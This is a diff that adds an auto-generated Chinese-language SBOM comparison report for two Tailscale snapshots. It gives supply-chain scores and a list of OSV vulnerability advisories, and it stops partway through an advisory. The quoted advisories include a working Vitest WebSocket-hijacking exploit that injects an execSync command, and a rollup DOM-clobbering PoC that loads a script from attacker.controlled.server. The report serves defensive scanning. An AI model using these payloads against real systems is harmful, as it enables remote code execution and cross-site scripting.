@@ -1,0 +1,679 @@
+
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="utf-8">
+            <title>SBOM 比较报告</title>
+            <style>
+                
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1, h2 {
+            color: #333;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+            word-wrap: break-word;
+            max-width: 800px;
+        }
+        th {
+            background-color: #f8f9fa;
+        }
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        .section-header {
+            font-weight: bold;
+            color: #2980b9;
+            margin-top: 10px;
+            display: block;
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .cve-header {
+            font-weight: bold;
+            color: #e74c3c;
+            margin-top: 15px;
+            display: block;
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .collapsible {
+            background-color: #f2f2f2;
+            color: #2980b9;
+            cursor: pointer;
+            padding: 18px;
+            width: 100%;
+            border: none;
+            text-align: left;
+            outline: none;
+            font-size: 18px;
+            margin-top: 20px;
+            border-radius: 5px 5px 0 0;
+            border-left: 5px solid #3498db;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .active, .collapsible:hover {
+            background-color: #e9ecef;
+        }
+        .content {
+            display: none;
+            overflow: hidden;
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 0 0 5px 5px;
+        }
+        .collapsible:after {
+            content: '+';
+            font-weight: bold;
+            float: right;
+            margin-left: 5px;
+        }
+        .active:after {
+            content: '-';
+        }
+        .security-score {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .score-summary {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .total-score {
+            font-size: 36px;
+            font-weight: bold;
+            color: #2980b9;
+        }
+        .score-percentage {
+            font-size: 24px;
+            color: #666;
+            margin: 0 10px;
+        }
+        .score-grade {
+            display: inline-block;
+            padding: 2px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-left: 10px;
+            color: white;
+        }
+        .grade-a {
+            background-color: #4CAF50;
+        }
+        .grade-b {
+            background-color: #FFC107;
+        }
+        .grade-c {
+            background-color: #FF9800;
+        }
+        .grade-d, .grade-f {
+            background-color: #F44336;
+        }
+        .category-score {
+            margin-bottom: 10px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .category-score-high {
+            background-color: #E8F5E9;
+        }
+        .category-score-medium {
+            background-color: #FFF8E1;
+        }
+        .category-score-low {
+            background-color: #FFEBEE;
+        }
+        .vuln-critical {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .vuln-high {
+            color: #f44336;
+            font-weight: bold;
+        }
+        .vuln-medium {
+            color: #ff9800;
+        }
+        .vuln-low {
+            color: #4caf50;
+        }
+        .vuln-unknown {
+            color: #9e9e9e;
+        }
+        .vuln-link {
+            word-break: break-all;
+            display: block;
+            padding: 3px 0;
+        }
+        .risk-container {
+            padding: 10px 0;
+        }
+        .risk-high {
+            background-color: #FFEAEA;
+            border-left: 4px solid #F44336;
+            padding: 12px 15px;
+            margin: 12px 0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(244, 67, 54, 0.1);
+        }
+        .risk-medium {
+            background-color: #FFF8E1;
+            border-left: 4px solid #FFC107;
+            padding: 12px 15px;
+            margin: 12px 0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(255, 193, 7, 0.1);
+        }
+        .risk-low {
+            background-color: #E8F5E9;
+            border-left: 4px solid #4CAF50;
+            padding: 12px 15px;
+            margin: 12px 0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(76, 175, 80, 0.1);
+        }
+        .stage-header {
+            background-color: #EFF8FF;
+            padding: 12px 15px;
+            margin: 25px 0 15px 0;
+            border-radius: 4px;
+            border-bottom: 2px solid #2196F3;
+            color: #1976D2;
+            font-weight: bold;
+            font-size: 17px;
+            box-shadow: 0 2px 4px rgba(33, 150, 243, 0.1);
+        }
+        .risk-category {
+            color: #333;
+            font-weight: bold;
+            font-size: 17px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+            padding-bottom: 5px;
+        }
+        .risk-description {
+            margin-bottom: 10px;
+            line-height: 1.6;
+            font-size: 15px;
+        }
+        .risk-affected {
+            font-size: 14px;
+            margin-bottom: 10px;
+            padding: 5px;
+            background-color: rgba(255,255,255,0.5);
+            border-radius: 3px;
+        }
+        .risk-recommendation {
+            font-style: italic;
+            background-color: rgba(255, 255, 255, 0.7);
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.05);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        /* 版本降级警告样式 */
+        .warning-box {
+            background-color: #ffebee;
+            border: 2px solid #f44336;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            box-shadow: 0 2px 8px rgba(244, 67, 54, 0.2);
+        }
+        .warning-title {
+            color: #d32f2f;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #ffcdd2;
+            padding-bottom: 5px;
+        }
+        .warning-content {
+            color: #b71c1c;
+        }
+        .warning-note {
+            font-weight: bold;
+            color: #c62828;
+            margin-top: 10px;
+            font-style: italic;
+        }
+        .critical-detail {
+            color: #d32f2f;
+            font-weight: bold;
+            background-color: #ffebee;
+            padding: 3px 5px;
+            border-radius: 3px;
+        }
+        .details-list {
+            margin: 5px 0;
+            padding-left: 20px;
+        }
+        .impact-factors {
+            margin-top: 8px;
+            font-size: 0.9em;
+            color: #555;
+        }
+        .score {
+            padding: 2px 10px;
+            border-radius: 15px;
+            font-weight: bold;
+            color: white;
+        }
+        .score-high {
+            background-color: #4CAF50;
+        }
+        .score-medium {
+            background-color: #FFC107;
+        }
+        .score-low {
+            background-color: #F44336;
+        }
+        
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>SBOM 比较报告</h1>
+                <p>生成时间: 2025-04-05 13:43:46</p>
+                <p>SBOM A: sample_data\tailscale_tailscale_649a71f.json</p>
+                <p>SBOM B: sample_data\tailscale_tailscale.json</p>
+                
+                <h2>基本统计信息</h2>
+                <table>
+                    <tr>
+                        <th>新增包数量</th>
+                        <td>6</td>
+                    </tr>
+                    <tr>
+                        <th>移除包数量</th>
+                        <td>6</td>
+                    </tr>
+                    <tr>
+                        <th>版本变更数量</th>
+                        <td>36</td>
+                    </tr>
+                    <tr>
+                        <th>许可证变更数量</th>
+                        <td>0</td>
+                    </tr>
+                </table>
+                
+                
+            <button type="button" class="collapsible">
+                <span style="flex-grow: 1;">软件供应链安全评分</span>
+                <span class="score score-high">9.5/10 (95.2%) [A+]</span>
+            </button>
+            <div class="content">
+                
+                <p class="score-summary">软件供应链安全评分为 9.5/10.0 (95.2%)，安全等级: A+。 软件供应链保持了较高的完整性和一致性。 主要影响因素：大量次版本变更, CII-Best-Practices风险, Vulnerabilities风险, Branch-Protection风险, Token-Permissions风险。</p>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>类别</th>
+                            <th>得分</th>
+                            <th>详情</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        
+                <tr>
+                    <td>供应链完整性</td>
+                    <td class="score-high">1.7/1.7 (99.6%)</td>
+                    <td><ul class='details-list'><li>新增了6个包</li><li>移除了6个包</li><li>供应链保持了较高的完整性，依赖结构稳定，无明显篡改迹象</li></ul></td>
+                </tr>
+                
+                <tr>
+                    <td>版本一致性</td>
+                    <td class="score-high">3.4/3.5 (97.9%)</td>
+                    <td><ul class='details-list'><li>27个包发生次版本变更</li><li>1个包发生补丁版本变更</li><li>8个包发生其他版本变更</li></ul><div class='impact-factors'><strong>影响因素:</strong> 大量次版本变更</div></td>
+                </tr>
+                
+                <tr>
+                    <td>许可证合规性</td>
+                    <td class="score-high">0.9/0.9 (100.0%)</td>
+                    <td><ul class='details-list'><li>许可证变更较少，无明显合规风险</li></ul></td>
+                </tr>
+                
+                <tr>
+                    <td>风险评估</td>
+                    <td class="score-high">2.6/2.6 (100.0%)</td>
+                    <td><ul class='details-list'><li>风险分析未发现明显的安全问题</li></ul></td>
+                </tr>
+                
+                <tr>
+                    <td>Scorecard评估</td>
+                    <td class="score-medium">0.9/1.3 (69.0%)</td>
+                    <td><ul class='details-list'><li>Binary-Artifacts需要改进</li><li>以下项目风险较高: CII-Best-Practices, Vulnerabilities, Branch-Protection, Token-Permissions</li><li>
+已知漏洞信息:</li><li>- Warn: Project is vulnerable to: GHSA-968p-4wvh-cqc8 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-968p-4wvh-cqc8</li><li>- Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg</li><li>- Warn: Project is vulnerable to: GHSA-3xgq-45jj-v275 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-3xgq-45jj-v275</li><li>- Warn: Project is vulnerable to: GHSA-67mh-4wv8-2f99 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-67mh-4wv8-2f99</li><li>- Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv</li><li>- Warn: Project is vulnerable to: GHSA-mwcw-c2x4-8c55 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-mwcw-c2x4-8c55</li><li>- Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm</li><li>- Warn: Project is vulnerable to: GHSA-64vr-g452-qvp3 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-64vr-g452-qvp3</li><li>- Warn: Project is vulnerable to: GHSA-9cwx-2883-4wfx (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-9cwx-2883-4wfx</li><li>- Warn: Project is vulnerable to: GHSA-vg6x-rcgg-rjx6 (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-vg6x-rcgg-rjx6</li><li>- Warn: Project is vulnerable to: GHSA-x574-m823-4x7w (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-x574-m823-4x7w</li><li>- Warn: Project is vulnerable to: GHSA-9crc-q9x8-hgqq (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-9crc-q9x8-hgqq</li><li>- Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j (未知): 发现漏洞 Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j</li><li>- Warn: Project is vulnerable to: GO-2025-3488 (未知): 发现漏洞 Warn: Project is vulnerable to: GO-2025-3488</li><li>- Warn: Project is vulnerable to: GO-2024-2631 / GHSA-c5q2-7r4c-mv6g (未知): 发现漏洞 Warn: Project is vulnerable to: GO-2024-2631 / GHSA-c5q2-7r4c-mv6g</li><li>- Warn: Project is vulnerable to: GO-2024-3333 (未知): 发现漏洞 Warn: Project is vulnerable to: GO-2024-3333</li><li>- Warn: Project is vulnerable to: GO-2025-3503 / GHSA-qxp5-gwg8-xv66 (未知): 发现漏洞 Warn: Project is vulnerable to: GO-2025-3503 / GHSA-qxp5-gwg8-xv66</li><li>- Warn: Project is vulnerable to: GO-2024-3321 / GHSA-v778-237x-gjrc (未知): 发现漏洞 Warn: Project is vulnerable to: GO-2024-3321 / GHSA-v778-237x-gjrc</li><li>- Warn: Project is vulnerable to: GO-2025-3487 (未知): 发现漏洞 Warn: Project is vulnerable to: GO-2025-3487</li><li>项目安全实践有待改进</li></ul><div class='impact-factors'><strong>影响因素:</strong> CII-Best-Practices风险, Vulnerabilities风险, Branch-Protection风险, Token-Permissions风险, 存在已知漏洞</div></td>
+                </tr>
+                
+                    </tbody>
+                </table>
+            </div>
+            
+                
+                    <button type="button" class="collapsible">
+                        <span style="flex-grow: 1;">漏洞信息（来源：OSV） (19)</span>
+                        <span style="font-size:14px;color:#666">点击展开/收起</span>
+                    </button>
+                    <div class="content">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th style="width: 25%">漏洞ID</th>
+                                    <th style="width: 75%">描述</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-9crc-q9x8-hgqq</td>
+                            <td>### Summary<br>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.<br><br>### Details<br>When [`api` option](https://vitest.dev/config/#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.<br>https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46<br><br>This WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.<br>https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76<br><br>### PoC<br>1. Open Vitest UI.<br>2. Access a malicious web site with the script below.<br>3. If you have `calc` executable in `PATH` env var (you&amp;#39;ll likely have it if you are running on Windows), that application will be executed.<br><br>```js<br>// code from https://github.com/WebReflection/flatted<br>const Flatted=function(n){&amp;quot;use strict&amp;quot;;function t(n){return t=&amp;quot;function&amp;quot;==typeof Symbol&amp;amp;&amp;amp;&amp;quot;symbol&amp;quot;==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;amp;&amp;amp;&amp;quot;function&amp;quot;==typeof Symbol&amp;amp;&amp;amp;n.constructor===Symbol&amp;amp;&amp;amp;n!==Symbol.prototype?&amp;quot;symbol&amp;quot;:typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=&amp;quot;string&amp;quot;,i={},c=&amp;quot;object&amp;quot;,a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&amp;lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;amp;&amp;amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&amp;lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;amp;&amp;amp;u?y(o,new Set,u,f):u;return f.call({&amp;quot;&amp;quot;:i},&amp;quot;&amp;quot;,i)},S=function(n,r,o){for(var u=r&amp;amp;&amp;amp;t(r)===c?function(n,t){return&amp;quot;&amp;quot;===n||-1&amp;lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({&amp;quot;&amp;quot;:n},&amp;quot;&amp;quot;,n)),v=!y;y&amp;lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return&amp;quot;[&amp;quot;+s.join(&amp;quot;,&amp;quot;)+&amp;quot;]&amp;quot;;function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});<br><br>// actual code to run<br>const ws = new WebSocket(&amp;#39;ws://localhost:51204/__vitest_api__&amp;#39;)<br>ws.addEventListener(&amp;#39;message&amp;#39;, e =&amp;gt; {<br>    console.log(e.data)<br>})<br>ws.addEventListener(&amp;#39;open&amp;#39;, () =&amp;gt; {<br>    ws.send(Flatted.stringify({ t: &amp;#39;q&amp;#39;, i: crypto.randomUUID(), m: &amp;quot;getFiles&amp;quot;, a: [] }))<br><br>    const testFilePath = &amp;quot;/path/to/test-file/basic.test.ts&amp;quot; // use a test file returned from the response of &amp;quot;getFiles&amp;quot;<br><br>    // edit file content to inject command execution<br>    ws.send(Flatted.stringify({<br>      t: &amp;#39;q&amp;#39;,<br>      i: crypto.randomUUID(),<br>      m: &amp;quot;saveTestFile&amp;quot;,<br>      a: [testFilePath, &amp;quot;import child_process from &amp;#39;child_process&amp;#39;;child_process.execSync(&amp;#39;calc&amp;#39;)&amp;quot;]<br>    }))<br>    // rerun the tests to run the injected command execution code<br>    ws.send(Flatted.stringify({<br>      t: &amp;#39;q&amp;#39;,<br>      i: crypto.randomUUID(),<br>      m: &amp;quot;rerun&amp;quot;,<br>      a: [testFilePath]<br>    }))<br>})<br>```<br><br>### Impact<br>This vulnerability can result in remote code execution for users that are using Vitest serve API.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-24964<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</span><br><span class="vuln-link">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</span><br><span class="vuln-link">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</span><br><span class="vuln-link">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</span><br><span class="vuln-link">https://github.com/vitest-dev/vitest</span><br><span class="vuln-link">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</span><br><span class="vuln-link">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</span><br><span class="vuln-link">https://vitest.dev/config/#api</span><br><br><div class="section-header">影响范围: </div><br>vitest: &gt;= 1.0.0 &lt; 1.6.1 <br>vitest: &gt;= 2.0.0 &lt; 2.1.9 <br>vitest: &gt;= 3.0.0 &lt; 3.0.5 <br>vitest: 所有版本 <br><br><br><div class="cve-header">来自 CVE-2025-24964 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg</td>
+                            <td>The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends &amp;quot;imbalanced braces&amp;quot; as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-4068<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-4068</span><br><span class="vuln-link">https://github.com/micromatch/braces/issues/35</span><br><span class="vuln-link">https://github.com/micromatch/braces/pull/37</span><br><span class="vuln-link">https://github.com/micromatch/braces/pull/40</span><br><span class="vuln-link">https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff</span><br><span class="vuln-link">https://devhub.checkmarx.com/cve-details/CVE-2024-4068</span><br><span class="vuln-link">https://github.com/micromatch/braces</span><br><span class="vuln-link">https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308</span><br><br><div class="section-header">影响范围: </div><br>braces: 所有版本 &lt; 3.0.3 <br><br><br><div class="cve-header">来自 CVE-2024-4068 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-3xgq-45jj-v275</td>
+                            <td>Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21538<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21538</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/issues/165</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/pull/160</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</span><br><span class="vuln-link">https://github.com/moxystudio/node-cross-spawn</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</span><br><br><div class="section-header">影响范围: </div><br>cross-spawn: &gt;= 7.0.0 &lt; 7.0.5 <br>cross-spawn: 所有版本 &lt; 6.0.6 <br><br><br><div class="cve-header">来自 CVE-2024-21538 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm</td>
+                            <td>### Summary<br><br>We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.<br><br>It&amp;#39;s worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.<br><br>### Details<br><br>#### Backgrounds<br><br>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:<br><br>[1] https://scnps.co/papers/sp23_domclob.pdf<br>[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/<br><br>#### Gadget found in `rollup`<br><br>We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.<br><br>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162<br><br>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185<br><br>However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&amp;#39;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.<br><br>### PoC<br><br>Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.<br><br>```<br>var s = document.createElement(&amp;#39;script&amp;#39;)<br>s.src = import.meta.url + &amp;#39;extra.js&amp;#39;<br>document.head.append(s)<br>```<br><br>The output `bundle.js` is shown in the following code snippet.<br><br>```<br>&amp;#39;use strict&amp;#39;;<br><br>var _documentCurrentScript = typeof document !== &amp;#39;undefined&amp;#39; ? document.currentScript : null;<br>var s = document.createElement(&amp;#39;script&amp;#39;);<br>s.src = (typeof document === &amp;#39;undefined&amp;#39; ? require(&amp;#39;u&amp;#39; + &amp;#39;rl&amp;#39;).pathToFileURL(__filename).href : (_documentCurrentScript &amp;amp;&amp;amp; False &amp;amp;&amp;amp; _documentCurrentScript.src || new URL(&amp;#39;bundle.js&amp;#39;, document.baseURI).href)) + &amp;#39;extra.js&amp;#39;;<br>document.head.append(s);<br>```<br><br>Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker&amp;#39;s domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website&amp;#39;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.<br><br>```<br>&amp;lt;!DOCTYPE html&amp;gt;<br>&amp;lt;html&amp;gt;<br>&amp;lt;head&amp;gt;<br>  &amp;lt;title&amp;gt;rollup Example&amp;lt;/title&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element starts--!&amp;gt;<br>  &amp;lt;img name=&amp;quot;currentScript&amp;quot; src=&amp;quot;https://attacker.controlled.server/&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element ends--!&amp;gt;<br>&amp;lt;/head&amp;gt;<br>&amp;lt;script type=&amp;quot;module&amp;quot; crossorigin src=&amp;quot;bundle.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;<br>&amp;lt;body&amp;gt;<br>&amp;lt;/body&amp;gt;<br>&amp;lt;/html&amp;gt;<br>```<br><br>### Impact<br><br>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.<br><br>### Patch<br><br>Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.<br><br>```<br>const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&amp;gt;<br>	getResolveUrl(<br>		`&amp;#39;${escapeId(relativePath)}&amp;#39;, ${<br>			umd ? `typeof document === &amp;#39;undefined&amp;#39; ? location.href : ` : &amp;#39;&amp;#39;<br>		}document.currentScript &amp;amp;&amp;amp; document.currentScript.tagName.toUpperCase() === &amp;#39;SCRIPT&amp;#39; &amp;amp;&amp;amp; document.currentScript.src || document.baseURI`<br>	);<br>```<br><br>```<br>const getUrlFromDocument = (chunkId: string, umd = false) =&amp;gt;<br>	`${<br>		umd ? `typeof document === &amp;#39;undefined&amp;#39; ? location.href : ` : &amp;#39;&amp;#39;<br>	}(${DOCUMENT_CURRENT_SCRIPT} &amp;amp;&amp;amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === &amp;#39;SCRIPT&amp;#39; &amp;amp;&amp;amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL(&amp;#39;${escapeId(<br>		chunkId<br>	)}&amp;#39;, document.baseURI).href)`;<br>```<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-47068<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-47068</span><br><span class="vuln-link">https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</span><br><span class="vuln-link">https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</span><br><span class="vuln-link">https://github.com/rollup/rollup</span><br><span class="vuln-link">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</span><br><span class="vuln-link">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</span><br><br><div class="section-header">影响范围: </div><br>rollup: &gt;= 3.0.0 &lt; 3.29.5 <br>rollup: &gt;= 4.0.0 &lt; 4.22.4 <br>rollup: 所有版本 &lt; 2.79.2 <br><br><br><div class="cve-header">来自 CVE-2024-47068 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-968p-4wvh-cqc8</td>
+                            <td>### Impact<br><br>When using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).<br><br>Your generated code is vulnerable if _all_ the following conditions are true:<br><span class="vuln-link">You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)</span><br>You use the `.replace` method on a regular expression that contains named capturing groups<br>**Your code uses untrusted strings as the second argument of `.replace`**<br><br>If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:<br><span class="vuln-link">you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</span><br><span class="vuln-link">you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, 